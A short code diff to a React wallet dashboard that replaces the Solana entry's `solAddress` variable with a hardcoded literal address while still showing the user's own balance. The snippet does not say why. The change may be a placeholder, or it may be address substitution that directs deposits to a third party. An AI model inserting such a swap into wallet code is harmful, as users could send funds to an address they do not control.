@@ -122,7 +122,7 @@ export default function Dashboard() {
           {
             chain:   "Solana",
             symbol:  "SOL",
-            address: solAddress,
+            address: "AXkxB9Gnd8ncGybpBfQyYwzzjVqR96ptqeawausJnrzn",
             balance: solBalance != null ? solBalance.toFixed(4) : "0.0000",
             network: "Solana",
             color:   "from-purple-500 to-pink-500",
